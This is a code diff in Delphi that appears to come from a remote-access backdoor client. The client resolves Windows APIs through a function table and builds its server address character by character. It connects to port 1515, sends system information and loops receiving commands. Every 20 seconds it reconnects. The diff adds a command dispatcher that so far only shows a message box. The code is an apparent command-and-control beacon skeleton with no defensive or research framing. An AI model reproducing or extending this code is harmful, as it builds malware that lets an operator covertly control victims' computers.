@@ -87,6 +87,13 @@ begin
   end;
 end;
 
+procedure ParsePacket(pConn:PConnRec; pBuffer:Pointer; dwLen:Cardinal; bCommand:Byte);
+begin
+  case bCommand of
+    0: pConn.pAPI.xMessageBoxW(0, pBuffer, nil, 0);
+  end;
+end;
+
 procedure ReceiveCommands(pConn:PConnRec);
 var
   iResult: Integer;
@@ -118,8 +125,7 @@ begin
         Break;
       end;
       //Parse Packet
-      pConn.pAPI.xMessageBoxW(0,mRecvBuffer,nil,0);
-      //ParsePacket(mySocket, mRecvBuffer, dwBufferLen - 1, bCommand);
+      ParsePacket(pConn, mRecvBuffer, dwBufferLen - 1, bCommand);
     end;
     pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
   end;
@@ -224,19 +230,23 @@ var
 begin
   strHost[0]:='1';strHost[1]:='2';strHost[2]:='7';strHost[3]:='.';strHost[4]:='0';strHost[5]:='.';strHost[6]:='0';strHost[7]:='.';strHost[8]:='1';strHost[9]:=#0;
   pConn := ResolveWinsockAPI(pAPI);
-  pConn.xWSAStartUp($202, WSAData);
-  while True do
+  if pConn <> nil then
   begin
-    pConn.hWinsock := ConnectToHost(pConn, @strHost[0], 1515);
-    if pConn.hWinsock <> INVALID_SOCKET then
+    pConn.xWSAStartUp($202, WSAData);
+    while True do
     begin
-      if SendInformation(pConn) then
+      pConn.hWinsock := ConnectToHost(pConn, @strHost[0], 1515);
+      if pConn.hWinsock <> INVALID_SOCKET then
       begin
-        ReceiveCommands(pConn);
+        if SendInformation(pConn) then
+        begin
+          ReceiveCommands(pConn);
+        end;
       end;
+      CloseSocket(pConn.hWinsock);
+      Sleep(20000);
     end;
-    CloseSocket(pConn.hWinsock);
-    Sleep(20000);
+    pAPI.xFreeMem(pAPI, pConn);
   end;
 end;
 
